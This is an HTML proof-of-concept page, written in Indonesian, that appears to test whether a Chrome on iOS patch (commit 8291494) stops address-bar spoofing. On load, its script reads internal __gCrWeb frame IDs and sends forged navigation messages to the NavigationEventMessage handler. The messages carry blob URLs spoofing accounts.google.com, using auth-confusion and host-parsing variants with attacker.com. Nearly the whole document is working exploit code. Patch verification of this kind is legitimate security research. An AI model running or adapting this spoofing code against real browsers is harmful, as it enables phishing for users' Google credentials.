<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Advanced PoC Bypass Test - Commit 8291494</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #fff5f5; color: #202124; }
        .card { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-bottom: 20px; }
        h1 { color: #d93025; font-size: 20px; margin-top: 0; }
        .info { color: #1a73e8; font-weight: bold; }
        pre { background: #202124; color: #f8f9fa; padding: 12px; border-radius: 6px; font-size: 12px; overflow-x: auto; }
        .btn-group { margin-top: 15px; }
        button { background: #d93025; color: white; border: none; padding: 10px 16px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #b31412; }
    </style>
</head>
<body>

<div class="card">
    <h1>Advanced PoC: Bypass Testing for Commit 8291494</h1>
    <p>Skrip ini menguji ketahanan fungsi <code>IsSameOriginWith</code> terhadap variasi URL non-standard dan *cross-origin blob*.</p>
    <p>Asal Dokumen Saat Ini (Real Origin): <code id="current-origin" class="info">Memuat...</code></p>
    
    <div class="btn-group">
        <button id="run-bypass">Jalankan Uji Coba Serangan Bypass</button>
    </div>
</div>

<div class="card">
    <h3>Log Eksekusi & Hasil Diagnostik:</h3>
    <pre id="console-log">[*] Menyiapkan lingkungan pengujian bypass...\n</pre>
</div>

<script>
(function() {
    const TARGET_VICTIM = "accounts.google.com";
    
    // Vektor uji coba bypass: Mencoba berbagai format blob URL & skema tricky
    const bypassVectors = [
        "blob:https://" + TARGET_VICTIM + "/signin-direct-spoof",
        "blob:https://" + TARGET_VICTIM + "@attacker.com/signin", // Percobaan Auth Confusion
        "blob:https://attacker.com:443@" + TARGET_VICTIM + "/signin", // Manipulasi Host Parsing
        "blob:http://" + TARGET_VICTIM + "/signin" // Cross-scheme blob (HTTP ke HTTPS target)
    ];

    function log(msg) {
        const pre = document.getElementById('console-log');
        pre.textContent += msg + '\n';
        console.log('[PoC-Bypass] ' + msg);
    }

    document.getElementById('current-origin').textContent = location.origin || '(opaque)';
    log('[-] location.href = ' + location.href);
    log('[-] location.origin = ' + location.origin);

    // Deteksi Handler Navigasi iOS Chrome
    const mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        log('[!] WARNING: Handler NavigationEventMessage tidak ditemukan. Pastikan berjalan di Chrome on iOS.');
        return;
    }
    log('[+] Handler NavigationEventMessage terdeteksi.');

    // Ambil Frame ID
    let frameId = null;
    try {
        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
            frameId = window.__gCrWeb.getFrameId();
            log('[+] Berhasil membaca frame_id: ' + frameId);
        }
    } catch (e) {
        log('[!] Gagal membaca frame_id secara langsung: ' + e.message);
    }

    if (!frameId) {
        // Fallback pencarian frameId
        const fallbacks = [
            () => window.__gCrWeb.common.getFrameId(),
            () => window.__gCrWeb.message.getFrameId(),
            () => window.__gCrWeb.frameId
        ];
        for (let i = 0; i < fallbacks.length && !frameId; i++) {
            try { frameId = fallbacks[i](); log('[+] Frame ID didapat via fallback [' + i + ']'); } catch(err){}
        }
    }

    if (!frameId) {
        log('[-] GAGAL: Tidak dapat menemukan frame_id yang valid. Eksekusi dihentikan.');
        return;
    }

    // Pemicu pendaftaran frame
    function triggerRegister() {
        try {
            if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
                window.__gCrWeb.registerFrame();
            } else if (window.__gCrWeb && window.__gCrWeb.crweb && typeof window.__gCrWeb.crweb.registerFrame === 'function') {
                window.__gCrWeb.crweb.registerFrame();
            }
        } catch (err) {}
    }

    triggerRegister();

    // Fungsi Eksekusi Serangan dengan Vektor Bypass
    function executeAttack() {
        bypassVectors.forEach((vectorUrl, index) => {
            try {
                log('\n[*] Mencoba Vektor Bypass #' + (index + 1) + ':');
                log('    Target URL -> ' + vectorUrl);

                // Kirim willChangeState
                mh.NavigationEventMessage.postMessage({
                    command: 'willChangeState',
                    frame_id: frameId
                });

                // Kirim didReplaceState dengan URL target bypass
                mh.NavigationEventMessage.postMessage({
                    command: 'didReplaceState',
                    frame_id: frameId,
                    stateObject: '',
                    baseUrl: 'https://x/',
                    pageUrl: vectorUrl
                });

                log('    [>] Pesan terkirim. Memeriksa respon browser...');
            } catch (ex) {
                log('    [!] Error saat postMessage: ' + ex.message);
            }
        });
        
        log('\n[INFO] Jika perbaikan commit 8291494 efektif, seluruh vektor di atas akan ditolak oleh url::IsSameOriginWith, sehingga address bar tidak akan berubah (menjadi no-op).');
    }

    document.getElementById('run-bypass').onclick = function() {
        triggerRegister();
        executeAttack();
    };

    // Auto-run setelah jeda singkat
    setTimeout(() => {
        triggerRegister();
        executeAttack();
    }, 500);

})();
</script>

</body>
</html>
